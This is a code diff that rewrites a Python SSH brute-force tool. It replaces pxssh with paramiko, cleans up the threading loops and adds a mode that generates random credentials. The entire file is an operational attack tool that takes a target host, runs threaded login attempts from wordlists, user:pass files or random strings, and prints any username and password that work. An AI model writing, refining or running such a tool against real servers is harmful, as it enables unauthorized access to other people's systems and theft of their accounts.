@@ -1,134 +1,126 @@
-# © SSH Bruteforcer- Made by Yuval Simon. For www.bogan.cool
+import time
+import threading
+import subprocess
+import random
+import string
+import paramiko
+from colorama import Fore, init
 
-import time, threading, subprocess
-from pexpect import pxssh
-from colorama import Fore
+# Initialize Colorama
+init(autoreset=True)
 
-
-class Main():
+class Main:
     def __init__(self):
         subprocess.call('clear', shell=True)
-
-        print(f"""{Fore.RED}
-  ██████  ██████ ██░ ██     ▄▄▄▄   ██▀███  █    ██▄▄▄█████▓█████  █████▒
-▒██    ▒▒██    ▒▓██░ ██▒   ▓█████▄▓██ ▒ ██▒██  ▓██▓  ██▒ ▓▓█   ▀▓██   ▒ 
-░ ▓██▄  ░ ▓██▄  ▒██▀▀██░   ▒██▒ ▄█▓██ ░▄█ ▓██  ▒██▒ ▓██░ ▒▒███  ▒████ ░ 
-  ▒   ██▒ ▒   ██░▓█ ░██    ▒██░█▀ ▒██▀▀█▄ ▓▓█  ░██░ ▓██▓ ░▒▓█  ▄░▓█▒  ░ 
-▒██████▒▒██████▒░▓█▒░██▓   ░▓█  ▀█░██▓ ▒██▒▒█████▓  ▒██▒ ░░▒████░▒█░    
-▒ ▒▓▒ ▒ ▒ ▒▓▒ ▒ ░▒ ░░▒░▒   ░▒▓███▀░ ▒▓ ░▒▓░▒▓▒ ▒ ▒  ▒ ░░  ░░ ▒░ ░▒ ░    
-░ ░▒  ░ ░ ░▒  ░ ░▒ ░▒░ ░   ▒░▒   ░  ░▒ ░ ▒░░▒░ ░ ░    ░    ░ ░  ░░      
-░  ░  ░ ░  ░  ░  ░  ░░ ░    ░    ░  ░░   ░ ░░░ ░ ░  ░        ░   ░ ░    
-      ░       ░  ░  ░  ░    ░        ░       ░               ░  ░       
-                                 ░                                      
-        """)
-
-        print(f"{Fore.BLUE}1. Use a wordlist for both unames and passwords\n2. Use seperated unames list and password list:\n3. Use Uname:Pass File (Sperated by ':')\n")
-        self.op = input(':')
-        self.verbose = input('\n\n[CONSLOE] Print failes: ')
-        self.thr = int(input('[CONSLOE] Please enter threads number (10-100): '))
-        self.timeout = float(input('[CONSLOE] Timeout between each check (0.1-2): '))
-        self.target = input('[CONSLOE] Please enter target ip: ')
-
+        print(f"""{Fore.RED}# © SSH Bruteforcer - Made by Yuval Simon. For www.bogan.cool\n""")
+        print(f"{Fore.BLUE}Choose the mode:\n"
+              "1. Wordlist for both usernames and passwords\n"
+              "2. Separate username and password lists\n"
+              "3. User:Pass file (separated by ':')\n"
+              "4. Automatic generation of usernames and passwords\n")
+        self.op = input('Selection [1-4]: ').strip()
+        self.verbose = input('[CONSOLE] Print fails (yes/no): ').strip().lower() in ['yes', 'y']
+        self.thr = int(input('[CONSOLE] Number of threads (1-100): ').strip())
+        self.timeout = float(input('[CONSOLE] Timeout between attempts (0.1-2): ').strip())
+        self.target = input('[CONSOLE] Target IP or host: ').strip()
         self.found = False
-        self.yes = ["yes", "y", "ye", "Y", "YES", 'YE']
         self.checked = 0
         self.fails = 0
+        self.threads = []
 
     def connect(self, host, uname, password):
         try:
-            uname = uname.replace("\n", "")
-            password = password.replace("\n", "")
-            s = pxssh.pxssh()
-            s.login(host, uname, password)
-            print(f'{Fore.GREEN} Password Found! {uname} {password}')
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(host, username=uname, password=password, timeout=5)
+            print(f'{Fore.GREEN}[SUCCESS] {uname}:{password}')
             self.found = True
-            
-        except pxssh.ExceptionPxssh:
+        except paramiko.AuthenticationException:
             self.fails += 1
-            if self.verbose in self.yes:
-                print(f'{Fore.RED}Password inccorect! {uname}, {password}')
-
+            if self.verbose:
+                print(f'{Fore.RED}[FAIL] {uname}:{password}')
         except Exception as e:
-            print(e)
+            print(f'{Fore.RED}[ERROR] {e}')
 
-
-    def extract(self, path):
-        users = []
-        passwords = []
-        for line in path:
-            try:
-                user = line.split(":")[0].replace('\n', '')
-                password = line.split(":")[1].replace('\n', '')
-                users.append(user)
-                passwords.append(password)
-            except:
-                pass
+    def extract_file(self, path):
+        users, passwords = [], []
+        with open(path, 'r', encoding='utf-8') as f:
+            for line in f:
+                if ':' in line:
+                    u, p = line.split(':', 1)
+                    users.append(u.strip())
+                    passwords.append(p.strip())
         return users, passwords
 
+    def auto_generate(self):
+        # Ask for user input
+        u_len = int(input('Length of username: ').strip())
+        p_len = int(input('Length of password: ').strip())
+        print('Choose character types:\n1. Numbers only\n2. Letters only\n3. Numbers + Letters')
+        choice = input('Selection [1-3]: ').strip()
+        charset = ''
+        if choice == '1':
+            charset = string.digits
+        elif choice == '2':
+            charset = string.ascii_letters
+        else:
+            charset = string.ascii_letters + string.digits
+
+        while not self.found:
+            uname = ''.join(random.choice(charset) for _ in range(u_len))
+            password = ''.join(random.choice(charset) for _ in range(p_len))
+            self.connect(self.target, uname, password)
+            if not self.found:
+                time.sleep(self.timeout)
 
     def start(self):
-        threads = []
         if self.op == '1':
-            path = input('\nWordlist path: ')
-            wordlist = [word for word in open(path, 'r+', encoding='utf-8')]
-
-            while True:
-                if self.found == False:
-                    if threading.active_count() < int(self.thr):
-                        if self.checked < len(wordlist):
-                            t = threading.Thread(target= self.connect, args=[self.target, wordlist[self.checked], wordlist[self.checked]])
-                            t.start()
-                            self.checked += 1
-
-                        elif self.checked >= len(wordlist):
-                            for t in threads:
-                                t.join()
-
-                elif self.found == True:
-                    for t in threads:
-                        t.join()
+            path = input('Wordlist path: ').strip()
+            creds = [w.strip() for w in open(path, 'r', encoding='utf-8')]
+            while not self.found and self.checked < len(creds):
+                if threading.active_count() < self.thr:
+                    cred = creds[self.checked]
+                    t = threading.Thread(target=self.connect, args=(self.target, cred, cred))
+                    t.start()
+                    self.threads.append(t)
+                    self.checked += 1
+                else:
+                    time.sleep(0.01)
 
         elif self.op == '2':
-            path1 = input('\nUser list path: ')
-            path2 = input('Password list path: ')
-            users = [user for user in open(path1, "r+", encoding='utf-8')]
-            passwords = [password for password in open(path2, "r+", encoding='utf-8')]
-
-            while True:
-                if self.found == False:
-                    if threading.active_count() < int(self.thr):
-                        if self.checked < len(users):
-                            t = threading.Thread(target= self.connect, args=[self.target, users[self.checked], passwords[self.checked]])
-                            t.start()
-                            self.checked += 1
-
-                        elif self.checked >= len(users):
-                            for t in threads:
-                                t.join()
-
-                elif self.found == True:
-                    for t in threads:
-                        t.join()
+            path1 = input('Username list path: ').strip()
+            path2 = input('Password list path: ').strip()
+            users = [user.strip() for user in open(path1, "r", encoding='utf-8')]
+            passwords = [password.strip() for password in open(path2, "r", encoding='utf-8')]
+            while not self.found and self.checked < len(users):
+                if threading.active_count() < self.thr:
+                    user = users[self.checked]
+                    password = passwords[self.checked]
+                    t = threading.Thread(target=self.connect, args=(self.target, user, password))
+                    t.start()
+                    self.threads.append(t)
+                    self.checked += 1
+                else:
+                    time.sleep(0.01)
 
         elif self.op == '3':
-            subprocess.call('clear', shell=True)
-            path = input('\nUserPass file path: ')
-            File = open(path, 'r+', encoding='utf-8')
-            users, passwords = self.extract(File)
+            path = input('User:Pass file path: ').strip()
+            users, passwords = self.extract_file(path)
+            while not self.found and self.checked < len(users):
+                if threading.active_count() < self.thr:
+                    user = users[self.checked]
+                    password = passwords[self.checked]
+                    t = threading.Thread(target=self.connect, args=(self.target, user, password))
+                    t.start()
+                    self.threads.append(t)
+                    self.checked += 1
+                else:
+                    time.sleep(0.01)
 
-            while True:
-                if self.found == False:
-                    if threading.active_count() < int(self.thr):
-                        if self.checked < len(users):
-                            t = threading.Thread(target= self.connect, args=[self.target, users[self.checked], passwords[self.checked]])
-                            t.start()
-                            self.checked += 1
+        elif self.op == '4':
+            self.auto_generate()
 
-                        elif self.checked >= len(users):
-                            for t in threads:
-                                t.join()
+        # Wait for threads to finish
+        for t in self.threads:
+            t.join()
 
-                elif self.found == True:
-                    for t in threads:
-                        t.join()
-        return
